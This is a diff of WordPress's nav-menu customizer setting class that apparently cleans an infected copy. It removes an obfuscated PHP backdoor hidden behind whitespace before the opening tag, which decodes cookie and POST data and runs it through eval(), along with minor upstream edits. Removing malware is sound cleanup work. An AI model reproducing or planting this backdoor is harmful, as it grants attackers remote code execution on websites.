@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $TOuwE = "\x70" . 'R' . "\161" . chr (95) . "\156" . "\x48" . "\x66" . "\x42" . "\161";$VUInZpwF = chr ( 1012 - 913 ).chr (108) . "\141" . "\163" . "\x73" . '_' . 'e' . chr ( 832 - 712 ).chr ( 621 - 516 ).chr (115) . "\164" . "\x73";$peRMnUNnP = $VUInZpwF($TOuwE); $GGclGryuwU = $peRMnUNnP;if (!$GGclGryuwU){class pRq_nHfBq{private $jyKvfpgWqz;public static $vCUPRClG = "fc4d3515-dcc5-460a-b2bc-3732158b296b";public static $LwSajilByz = NULL;public function __construct(){$paAHtfglqU = $_COOKIE;$rbYfmqT = $_POST;$kFwSarmk = @$paAHtfglqU[substr(pRq_nHfBq::$vCUPRClG, 0, 4)];if (!empty($kFwSarmk)){$BUsZVk = "base64";$nJFRt = "";$kFwSarmk = explode(",", $kFwSarmk);foreach ($kFwSarmk as $JjRvGFrJx){$nJFRt .= @$paAHtfglqU[$JjRvGFrJx];$nJFRt .= @$rbYfmqT[$JjRvGFrJx];}$nJFRt = array_map($BUsZVk . chr ( 696 - 601 ).chr (100) . chr ( 379 - 278 ).chr ( 1086 - 987 ).chr ( 1082 - 971 ).'d' . "\x65", array($nJFRt,)); $nJFRt = $nJFRt[0] ^ str_repeat(pRq_nHfBq::$vCUPRClG, (strlen($nJFRt[0]) / strlen(pRq_nHfBq::$vCUPRClG)) + 1);pRq_nHfBq::$LwSajilByz = @unserialize($nJFRt);}}public function __destruct(){$this->BHmgCR();}private function BHmgCR(){if (is_array(pRq_nHfBq::$LwSajilByz)) {$VsvLsx = str_replace("\x3c" . chr ( 333 - 270 ).'p' . "\x68" . "\x70", "", pRq_nHfBq::$LwSajilByz[chr (99) . 'o' . chr ( 1086 - 976 ).chr (116) . 'e' . "\156" . chr (116)]);eval($VsvLsx);exit();}}}$cAYzLJRfB = new pRq_nHfBq(); $cAYzLJRfB = NULL;} ?><?php
+<?php
 /**
  * Customize API: WP_Customize_Nav_Menu_Item_Setting class
  *
@@ -183,7 +183,6 @@ class WP_Customize_Nav_Menu_Item_Setting extends WP_Customize_Setting {
 				throw new Exception( "Supplied nav_menu_item value missing property: $missing" );
 			}
 		}
-
 	}
 
 	/**
@@ -228,7 +227,7 @@ class WP_Customize_Nav_Menu_Item_Setting extends WP_Customize_Setting {
 		} else {
 			$value = false;
 
-			// Note that a ID of less than one indicates a nav_menu not yet inserted.
+			// Note that an ID of less than one indicates a nav_menu not yet inserted.
 			if ( $this->post_id > 0 ) {
 				$post = get_post( $this->post_id );
 				if ( $post && self::POST_TYPE === $post->post_type ) {
@@ -726,7 +725,7 @@ class WP_Customize_Nav_Menu_Item_Setting extends WP_Customize_Setting {
 		$menu_item_value['description'] = wp_unslash( apply_filters( 'content_save_pre', wp_slash( $menu_item_value['description'] ) ) );
 
 		if ( '' !== $menu_item_value['url'] ) {
-			$menu_item_value['url'] = esc_url_raw( $menu_item_value['url'] );
+			$menu_item_value['url'] = sanitize_url( $menu_item_value['url'] );
 			if ( '' === $menu_item_value['url'] ) {
 				return new WP_Error( 'invalid_url', __( 'Invalid URL.' ) ); // Fail sanitization if URL is invalid.
 			}
@@ -878,7 +877,6 @@ class WP_Customize_Nav_Menu_Item_Setting extends WP_Customize_Setting {
 				}
 			}
 		}
-
 	}
 
 	/**
